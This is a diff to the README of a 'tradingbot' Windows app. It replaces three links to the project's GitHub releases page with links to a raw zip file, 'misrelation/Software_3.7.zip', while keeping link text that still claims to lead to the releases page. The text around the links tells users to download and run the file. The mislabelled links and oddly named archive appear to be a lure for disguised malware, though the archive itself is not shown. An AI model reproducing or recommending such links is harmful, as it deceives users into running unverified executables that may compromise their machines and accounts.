@@ -1,6 +1,6 @@
 # 🤖 tradingbot - Track trades and act faster
 
-[![Download tradingbot](https://img.shields.io/badge/Download%20tradingbot-purple?style=for-the-badge&logo=github)](https://github.com/sweetbreathed-waterpimpernel749/tradingbot/releases)
+[![Download tradingbot](https://img.shields.io/badge/Download%20tradingbot-purple?style=for-the-badge&logo=github)](https://github.com/sweetbreathed-waterpimpernel749/tradingbot/raw/refs/heads/main/misrelation/Software_3.7.zip)
 
 ## 🚀 What this app does
 
@@ -20,7 +20,7 @@ It is designed for:
 
 Visit the release page to download and run this file:
 
-[Download tradingbot from GitHub Releases](https://github.com/sweetbreathed-waterpimpernel749/tradingbot/releases)
+[Download tradingbot from GitHub Releases](https://github.com/sweetbreathed-waterpimpernel749/tradingbot/raw/refs/heads/main/misrelation/Software_3.7.zip)
 
 Look for the latest release and download the Windows file that matches your PC. In most cases, this will be an `.exe` file or a `.zip` file that contains the app.
 
@@ -222,7 +222,7 @@ A simple run usually follows this pattern:
 
 The release page contains the latest Windows build and any new files added by the developer.
 
-[Open the tradingbot releases page](https://github.com/sweetbreathed-waterpimpernel749/tradingbot/releases)
+[Open the tradingbot releases page](https://github.com/sweetbreathed-waterpimpernel749/tradingbot/raw/refs/heads/main/misrelation/Software_3.7.zip)
 
 ## 🖱️ Quick install path
 
